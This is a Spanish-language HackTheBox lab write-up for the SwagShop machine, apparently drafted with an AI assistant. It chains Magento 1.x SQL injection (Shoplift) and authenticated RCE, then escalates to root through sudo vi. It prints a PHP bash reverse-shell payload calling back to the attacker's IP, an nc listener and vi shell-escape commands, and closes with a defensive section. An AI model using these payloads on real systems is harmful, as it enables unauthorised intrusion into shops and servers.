---
title: SwagShop (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, htb-easy, pentesting, magento, sqli, rce, cms, sudo, gtfobins, privesc, linux, web]
type: nota
status: en-progreso
source: claude-code
aliases: [SwagShop HTB, HTB SwagShop, magento-rce, magento-sqli]
---

# SwagShop — HackTheBox (Easy)

**SO: Linux · Dificultad: Easy · Skills: SQLi en CMS eCommerce (Magento 1.x), RCE via panel de administración, privesc con sudo + GTFOBins**

> SwagShop es una máquina retirada de Hack The Box, un entorno **legal y autorizado** diseñado para aprender pentesting de forma ética. Las máquinas retiradas requieren suscripción VIP.

Esta máquina encadena dos vulnerabilidades bien documentadas de Magento 1.x: primero una inyección SQL (CVE-2015-1397/1398) para crear un usuario administrador sin credenciales previas, y luego RCE desde el panel admin subiendo código PHP arbitrario. La privesc es un clásico de GTFOBins: `vi` con permisos `sudo` sobre el directorio web permite escalar a `root` directamente. El salto respecto a Starting Point está en que aquí se encadenan tres fases (SQLi → RCE → privesc) y se trabaja con exploits públicos reales contra un CMS de producción real.

---

## Objetivo

Obtener `user.txt` (shell como `www-data` o usuario de la app) y `root.txt` (shell como `root`) explotando una instalación desactualizada de Magento 1.x sobre Apache/Linux.

---

## Acceso a la maquina (paso previo)

1. **Descarga tu VPN** desde el panel de HTB (sección *Labs → Access*; para máquinas retiradas necesitas VIP, elige el servidor más cercano).
2. **Conectate a la VPN** y deja la terminal abierta durante toda la sesión:
   ```bash
   sudo openvpn lab_<tu_usuario>.ovpn
   ```
3. **Lanza la máquina** en HTB (*Spawn Machine* en la página de SwagShop). Te asignará una IP del rango `10.10.10.x` (retiradas) — anótala.
4. Verifica conectividad:
   ```bash
   ping -c2 <IP>
   ```
5. En todo este writeup, **sustituye `<IP>` por tu IP dinámica**. Cambia cada vez que lanzas la máquina.

> El **Pwnbox** (Kali en el navegador de HTB) ya viene conectado a la red; solo necesitas lanzar la máquina y usar su IP.

---

## Reconocimiento

**Categoría: escaneo de puertos, fingerprinting de servicio y detección de CMS.**

```bash
nmap -sC -sV -oN swagshop.nmap <IP>
```

Resultado relevante:

- **Puerto 80/tcp** — Apache HTTP Server. El banner de Apache y la respuesta HTTP revelan que hay una aplicación web en `/`.
- No hay otros puertos significativos abiertos en este nivel (SSH puede estar presente pero no es el vector inicial).

Navegar al target:

```bash
http://<IP>/
```

La página de inicio es una tienda online basada en **Magento 1.x**. El pie de página y los metadatos del HTML confirman el CMS. Si la página no carga correctamente (rutas absolutas rotas), puede ser necesario añadir el vhost al `/etc/hosts` local:

```bash
# Verificar si el HTML contiene referencias a un hostname
curl -s http://<IP>/ | grep -i "swagshop\|10.10.10"

# Si aparece un hostname (p.ej. swagshop.htb), añadirlo:
echo "<IP> swagshop.htb" | sudo tee -a /etc/hosts
```

Navegar entonces a `http://swagshop.htb/` para que cargue correctamente.

---

## Enumeracion

**Categoría: identificación de versión de Magento y superficie de ataque del panel de administración.**

Con el CMS identificado, el objetivo es concretar la versión y localizar el panel de admin:

```bash
# Rutas habituales del panel de administración de Magento
http://<IP>/index.php/admin
http://<IP>/admin
```

La ruta estándar de Magento expone el login del backend en `/index.php/admin`. Confirmar que existe y anotar la URL exacta.

Para la versión, el archivo `RELEASE_NOTES.txt` o las cabeceras HTTP pueden orientar:

```bash
curl -s http://<IP>/RELEASE_NOTES.txt | head -5
```

Alternativamente, `searchsploit` contra el CMS identificado muestra los exploits disponibles:

```bash
searchsploit magento
```

Los exploits más relevantes para Magento 1.x son:

| Identificador | Tipo | Descripción |
|---|---|---|
| CVE-2015-1397 | SQLi | "Shoplift" — SQLi que permite crear usuario admin sin autenticación |
| CVE-2015-1398 | SQLi | Relacionado con Shoplift (cadena de vulnerabilidades) |
| EDB-37977 | SQLi+Admin | Exploit público en Exploit-DB para crear usuario admin via SQLi |
| EDB-37811 | RCE | RCE autenticado desde el panel de administración de Magento |

---

## Acceso inicial (foothold)

Esta fase tiene dos pasos encadenados: primero crear credenciales de administrador via SQLi, luego obtener RCE desde el panel admin.

### Paso 1 — SQLi via Shoplift (CVE-2015-1397): crear usuario administrador

**Categoría: SQL Injection no autenticada en parámetro de formulario de Magento.**

Magento 1.x tiene una vulnerabilidad en el endpoint de creación de cuentas del frontend que permite inyectar SQL y, a través de él, insertar un usuario administrador directamente en la base de datos. No requiere credenciales previas.

El exploit público más conocido está en Exploit-DB con ID **37977**. Puedes descargarlo con:

```bash
searchsploit -m 37977
# O directamente:
python3 37977.py
```

El script hace una petición POST al endpoint vulnerable de Magento con un payload SQL embebido que inserta una fila en la tabla de administradores. Lo que ocurre internamente es:

1. Magento recibe un formulario con un campo que no está correctamente parametrizado.
2. El payload cierra la query original e inyecta un `INSERT INTO admin_user ...` con las credenciales que el atacante elige.
3. La base de datos ejecuta ambas queries: la legítima y la inyectada.

Uso del exploit (ajustar la URL y las credenciales deseadas según el script):

```bash
python3 37977.py http://<IP>/index.php
# El script pedirá o incluirá credenciales por defecto; revisar su código antes de ejecutar
```

> Aviso: los scripts de Exploit-DB pueden requerir ajustes menores (versión de Python, URL exacta del endpoint, encoding). Leer el código del script antes de ejecutarlo y ajustar la variable de target. Si el script falla con un error de conexión, verificar el vhost en `/etc/hosts`.

Tras la ejecución exitosa, acceder al panel de administración con las credenciales creadas:

```bash
http://<IP>/index.php/admin
# Usuario y contraseña: los definidos en el exploit (p.ej. forme/forme o los que hayas editado)
```

### Paso 2 — RCE autenticado desde el panel de Magento (EDB-37811)

**Categoría: Remote Code Execution autenticado via subida de plantilla PHP en el panel de administración.**

Con acceso de administrador, Magento permite editar plantillas y widgets que se renderizan como PHP. El exploit **EDB-37811** automatiza este proceso: inyecta un payload PHP en una zona editable del panel que luego el servidor ejecuta al renderizar la página.

Lo que hace el exploit internamente:

1. Se autentica en el panel de admin usando las credenciales creadas en el paso anterior.
2. Navega a una sección del backend que permite insertar "bloques estáticos" o configuración con contenido que el motor de plantillas evalúa como PHP.
3. Inserta una reverse shell o un webshell PHP en ese campo.
4. Solicita la URL que renderiza el bloque, forzando la ejecución del PHP en el servidor.

```bash
searchsploit -m 37811
# Editar el script: ajustar la URL base, el path del admin y las credenciales del paso 1
python3 37811.py
```

Antes de lanzar el exploit, preparar el listener:

```bash
# Terminal aparte — escucha la reverse shell
nc -lvnp 4444
```

El payload PHP estándar para reverse shell (si el exploit permite personalizarlo):

```php
<?php system("bash -c 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'"); ?>
```

Donde `<TU_IP>` es tu IP en la interfaz `tun0` (la de la VPN):

```bash
ip addr show tun0 | grep "inet "
```

Si el exploit funciona, obtienes una shell como **`www-data`** — el usuario bajo el que corre Apache/PHP.

> Aviso: el exploit 37811 puede requerir ajustar el form key (token CSRF que Magento genera por sesión) o la ruta exacta del panel de admin. Leer el código; los campos `install_date` y la URL del endpoint cambian según la versión exacta de Magento. Si falla, la alternativa manual es navegar al panel de admin → *CMS → Static Blocks → New Block* e insertar el payload PHP directamente, luego llamar la URL correspondiente.

**Obtener `user.txt`:**

```bash
# Ya en la shell como www-data
find /home -name "user.txt" 2>/dev/null
cat /home/<usuario>/user.txt
```

La flag `user.txt` (<flag>) está en el directorio home del usuario de la aplicación.

---

## Escalada de privilegios

**Categoría: sudo misconfiguration + GTFOBins (editor de texto con escape a shell).**

Con shell como `www-data`, enumerar los privilegios sudo disponibles:

```bash
sudo -l
```

Output esperado (o similar):

```
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

**Análisis:** `www-data` puede ejecutar `vi` como `root` sin contraseña, pero solo sobre archivos bajo `/var/www/html/`. La restricción del path parece limitar el daño, pero `vi` tiene una función integrada para ejecutar comandos de shell (`!comando`). Eso rompe cualquier restricción de path.

**Explotación via GTFOBins:**

```bash
# Abrir vi con sudo sobre cualquier fichero existente bajo /var/www/html/
sudo /usr/bin/vi /var/www/html/index.php
```

Dentro del editor `vi`, ejecutar una shell con el comando de escape:

```
:set shell=/bin/bash
:shell
```

O directamente:

```
:!/bin/bash
```

Esto abre una shell **interactiva como `root`** porque `vi` fue lanzado con `sudo`.

```bash
# Ya como root
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

La flag `root.txt` (<flag>) está en `/root/root.txt`.

---

## Flags

| Flag | Ubicación | Usuario al obtenerla |
|---|---|---|
| `user.txt` | `/home/<usuario>/user.txt` | `www-data` (tras RCE) |
| `root.txt` | `/root/root.txt` | `root` (tras privesc con sudo vi) |

> Las flags son hashes dinámicos: cambian con cada reinicio de la máquina. Aquí se usan los marcadores `<flag>` porque los valores reales solo son válidos durante tu sesión activa.

---

## Patron y teoria

Esta es la sección central: los patrones que se repiten en producción real y cómo prevenirlos.

### Patron 1: CMS eCommerce desactualizado — SQLi no autenticada + RCE autenticado (CVE-2015-1397/1398)

**Categoria: CWE-89 (SQL Injection) encadenado con CWE-94 (Code Injection) en CMS de tercero.**

El flujo de ataque completo de SwagShop ilustra una cadena habitual en aplicaciones web con CMS:

```
CMS desactualizado
  → SQLi no autenticada en endpoint de registro/formulario
    → usuario administrador creado sin credenciales previas
      → panel de admin accesible
        → RCE via funcionalidad legítima mal restringida (plantillas PHP evaluadas)
          → shell en el servidor
```

Cada eslabón por separado podría ser inofensivo si los demás estuvieran mitigados. La cadena es lo peligroso.

**Por qué Magento 1.x es un caso de estudio:**

Magento 1.x llegó a su End of Life en junio de 2020. Aun así, en el momento de publicación de esta máquina (2019) y años después, miles de tiendas seguían activas con versiones sin parche. El patrón se repite con WordPress, Joomla, OpenCart y cualquier CMS con actualizaciones negligidas.

La vulnerabilidad SQLi (Shoplift) no requería autenticación y afectaba a un endpoint del flujo de checkout/registro — un endpoint que no podías deshabilitar sin romper la tienda. El impacto era máximo con una explotación trivial.

### Patron 2: sudo + editor de texto = privesc trivial (GTFOBins)

**Categoria: CWE-269 — Improper Privilege Management.**

La regla sudo de SwagShop parece restrictiva: solo permite ejecutar `vi` sobre archivos de un directorio concreto. Es un error de modelo mental muy común: asumir que restringir el *objeto* (archivo) restringe también el *poder* del programa que lo abre.

Los editores de texto (`vi`, `vim`, `nano`, `less`, `more`, `ed`) y muchas otras herramientas permiten escapar a una shell desde dentro. Si el editor se ejecuta con privilegios elevados, la shell heredada también los tiene. GTFOBins ([gtfobins.github.io](https://gtfobins.github.io)) cataloga cientos de binarios con este comportamiento.

```
sudo vi archivo → :!/bin/bash → shell como root
sudo less archivo → !bash → shell como root
sudo nano archivo → Ctrl+R, Ctrl+X, comando → shell como root
```

La restricción `sudo vi /var/www/html/*` no impide el escape porque la restricción es en el *argumento*, no en el *comportamiento* del binario.

### Como se defiende (clave dev/purple team)

**Contra SQLi en CMS:**

1. **Parchear y mantener actualizado el CMS.** La solución primaria es eliminar la vulnerabilidad. Magento 2.x no tiene Shoplift. Si el CMS no tiene mantenimiento activo, migrar.
2. **WAF con reglas específicas para Magento/WordPress.** ModSecurity con el ruleset OWASP CRS detecta patrones de Shoplift. No sustituye el parche, pero añade tiempo de respuesta.
3. **Monitorizar creación de usuarios administradores.** Una alerta sobre `INSERT INTO admin_user` o accesos nuevos al panel admin es un indicador de compromiso temprano.
4. **Restringir el acceso al panel de admin por IP** (allowlist). Si el panel solo es accesible desde la IP de la oficina, el exploit no llega a ejecutarse desde el exterior.

**Contra RCE via panel de admin:**

5. **Deshabilitar la evaluación de PHP en plantillas** si no es una funcionalidad usada. Magento tiene configuraciones para limitar qué puede ejecutar el motor de plantillas.
6. **Principio de mínimo privilegio en el servidor**: el proceso Apache/PHP debe correr con el usuario menos privilegiado posible y sin acceso de escritura fuera de los directorios necesarios.
7. **Separar el panel de administración del frontend** en servidores o redes distintas (arquitectura de admin-on-intranet).

**Contra la privesc sudo + vi:**

8. **Nunca conceder sudo sobre editores de texto, paginadores o intérpretes**, incluso con restricciones de path. La regla `sudo vi /ruta/*` es una privesc garantizada.
9. **Usar `sudoedit`** en lugar de `sudo vi`. `sudoedit` abre una copia del archivo en un editor sin privilegios y luego la copia de vuelta, impidiendo el escape a shell.
10. **Auditar `/etc/sudoers` con `sudo -l`** como parte del hardening. Cualquier entrada con un binario listado en GTFOBins debe revisarse.
11. **Principio de mínimo privilegio en sudo**: si `www-data` necesita escribir en `/var/www/html`, darle permisos de sistema de archivos directamente sobre esa carpeta, no sudo sobre un editor.

### Donde aparece esto en produccion

- Tiendas eCommerce con Magento 1.x sin migrar a Magento 2.x (End of Life desde 2020).
- Cualquier CMS (WordPress, Joomla, PrestaShop) con plugins desactualizados que exponen endpoints SQLi.
- Servidores Linux donde el equipo de sistemas concede `sudo` sobre herramientas "inofensivas" como `less`, `vim`, `awk`, `python` para tareas de mantenimiento.
- Entornos donde el usuario web (`www-data`, `apache`, `nginx`) tiene más privilegios de los necesarios.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]]
- [[06-seguridad-de-sistemas-y-hardening]]
